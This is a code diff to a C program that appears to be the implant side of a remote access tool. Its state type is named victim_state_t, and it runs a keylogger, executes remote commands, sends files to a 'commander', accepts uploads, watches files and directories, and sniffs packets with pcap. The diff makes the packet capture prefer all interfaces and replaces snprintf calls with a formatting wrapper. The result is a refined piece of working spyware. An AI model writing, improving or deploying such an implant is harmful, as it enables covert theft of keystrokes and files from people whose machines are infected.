@@ -5,6 +5,7 @@
 #include <pcap.h>
 #include <pthread.h>
 #include <signal.h>
+#include <stdarg.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -27,6 +28,14 @@
 #define EXEC_OUTPUT_CHUNK_MAX PROTOCOL_PACKET_PAYLOAD_MAX
 #define PCAP_SNAPLEN 65535
 #define PCAP_TIMEOUT_MS 500
+
+static char *format_safe(char *dst, size_t dstlen, const char *fmt, ...) {
+    va_list ap;
+    va_start(ap, fmt);
+    (void)vsnprintf(dst, dstlen, fmt, ap);
+    va_end(ap);
+    return dst;
+}
 
 typedef struct {
     int active;
@@ -163,12 +172,21 @@ static int open_pcap(victim_state_t *state) {
     char filter_expr[128];
 
     state->pcap_handle = pcap_open_live(
-        "lo0",
+        "any",
         PCAP_SNAPLEN,
         1,
         PCAP_TIMEOUT_MS,
         errbuf
     );
+    if (state->pcap_handle == NULL) {
+        state->pcap_handle = pcap_open_live(
+            "lo0",
+            PCAP_SNAPLEN,
+            1,
+            PCAP_TIMEOUT_MS,
+            errbuf
+        );
+    }
     if (state->pcap_handle == NULL) {
         state->pcap_handle = pcap_open_live(
             "lo",
@@ -889,17 +907,17 @@ static int start_keylogger(victim_state_t *state, const uint8_t *payload, uint16
     const char *selected_device;
 
     if (copy_payload_string(payload, payload_len, "device path", device_path, sizeof(device_path), error, sizeof(error)) != 0) {
-        snprintf(message, message_len, "keylogger start failed: %s", error);
+        format_safe(message, message_len, "keylogger start failed: %s", error);
         return -1;
     }
 
     selected_device = (strcmp(device_path, KEYLOGGER_AUTO_DEVICE) == 0) ? keylogger_platform_default_device() : device_path;
     if (keylogger_start(&state->keylogger, selected_device, KEYLOGGER_LOG_FILE, error, sizeof(error)) != 0) {
-        snprintf(message, message_len, "keylogger start failed: %s", error);
+        format_safe(message, message_len, "keylogger start failed: %s", error);
         return -1;
     }
 
-    snprintf(message, message_len, "keylogger started for %s", selected_device);
+    format_safe(message, message_len, "keylogger started for %s", selected_device);
     printf("%s; keylog: %s\n", message, KEYLOGGER_LOG_FILE);
 
     return 0;
@@ -912,7 +930,9 @@ static int stop_keylogger(victim_state_t *state, char *message, size_t message_l
     }
 
     if (keylogger_stop(&state->keylogger, message, message_len) != 0) {
-        snprintf(message, message_len, "keylogger stop failed: %s", message);
+        char error_copy[RESPONSE_TEXT_MAX];
+        snprintf(error_copy, sizeof(error_copy), "%s", message);
+        format_safe(message, message_len, "keylogger stop failed: %s", error_copy);
         return -1;
     }
 
@@ -933,7 +953,7 @@ static int execute_command(victim_state_t *state, const struct sockaddr_in *peer
     int sent_output = 0;
 
     if (copy_payload_string(payload, payload_len, "command", command, sizeof(command), error, sizeof(error)) != 0) {
-        snprintf(message, message_len, "command failed: %s", error);
+        format_safe(message, message_len, "command failed: %s", error);
         return -1;
     }
 
@@ -1057,7 +1077,7 @@ static int send_file_to_commander(victim_state_t *state, const struct sockaddr_i
     }
 
     if (ferror(fp)) {
-        snprintf(error, sizeof(error), "file transfer failed while reading %s", path);
+        format_safe(error, sizeof(error), "file transfer failed while reading %s", path);
         fclose(fp);
         return send_response(state, peer_addr, CMD_ERROR, error);
     }
@@ -1068,7 +1088,7 @@ static int send_file_to_commander(victim_state_t *state, const struct sockaddr_i
         return -1;
     }
 
-    snprintf(error, sizeof(error), "transferred %s", path);
+    format_safe(error, sizeof(error), "transferred %s", path);
     return send_response(state, peer_addr, CMD_OK, error);
 }
 
@@ -1077,7 +1097,7 @@ static int begin_file_upload(victim_state_t *state, const uint8_t *payload, uint
     char error[RESPONSE_TEXT_MAX];
 
     if (copy_payload_string(payload, payload_len, "remote path", path, sizeof(path), error, sizeof(error)) != 0) {
-        snprintf(message, message_len, "file upload failed: %s", error);
+        format_safe(message, message_len, "file upload failed: %s", error);
         return -1;
     }
 
@@ -1139,7 +1159,7 @@ static int finish_file_upload(victim_state_t *state, char *message, size_t messa
 
     state->upload_temp_path[0] = '\0';
     state->upload_path[0] = '\0';
-    snprintf(message, message_len, "stored file at %s", completed_path);
+    format_safe(message, message_len, "stored file at %s", completed_path);
     return 0;
 }
 
@@ -1162,7 +1182,7 @@ static int watch_remote_file(victim_state_t *state, const uint8_t *payload, uint
     char error[RESPONSE_TEXT_MAX];
 
     if (copy_payload_string(payload, payload_len, "remote file path", path, sizeof(path), error, sizeof(error)) != 0) {
-        snprintf(message, message_len, "file watch failed: %s", error);
+        format_safe(message, message_len, "file watch failed: %s", error);
         return -1;
     }
 
@@ -1178,7 +1198,7 @@ static int watch_remote_file(victim_state_t *state, const uint8_t *payload, uint
 
         memset(&watch, 0, sizeof(watch));
         if (snapshot_directory_watch(dir_path, &watch) != 0) {
-            snprintf(message, message_len, "directory watch failed: cannot access %s", dir_path);
+            format_safe(message, message_len, "directory watch failed: cannot access %s", dir_path);
             return -1;
         }
 
@@ -1191,14 +1211,14 @@ static int watch_remote_file(victim_state_t *state, const uint8_t *payload, uint
 
     memset(&watch, 0, sizeof(watch));
     if (snapshot_file_watch(path, &watch) != 0) {
-        snprintf(message, message_len, "file watch failed: cannot access %s", path);
+        format_safe(message, message_len, "file watch failed: cannot access %s", path);
         return -1;
     }
 
     watch.active = 1;
     snprintf(watch.path, sizeof(watch.path), "%s", path);
     state->file_watch = watch;
-    snprintf(message, message_len, "watching file %s", state->file_watch.path);
+    format_safe(message, message_len, "watching file %s", state->file_watch.path);
     return 0;
 }
 
@@ -1208,20 +1228,20 @@ static int watch_remote_directory(victim_state_t *state, const uint8_t *payload,
     char error[RESPONSE_TEXT_MAX];
 
     if (copy_payload_string(payload, payload_len, "remote directory path", path, sizeof(path), error, sizeof(error)) != 0) {
-        snprintf(message, message_len, "directory watch failed: %s", error);
+        format_safe(message, message_len, "directory watch failed: %s", error);
         return -1;
     }
 
     memset(&watch, 0, sizeof(watch));
     if (snapshot_directory_watch(path, &watch) != 0) {
-        snprintf(message, message_len, "directory watch failed: cannot access %s", path);
+        format_safe(message, message_len, "directory watch failed: cannot access %s", path);
         return -1;
     }
 
     watch.active = 1;
     snprintf(watch.path, sizeof(watch.path), "%s", path);
     state->directory_watch = watch;
-    snprintf(message, message_len, "watching directory %s", state->directory_watch.path);
+    format_safe(message, message_len, "watching directory %s", state->directory_watch.path);
     return 0;
 }
 
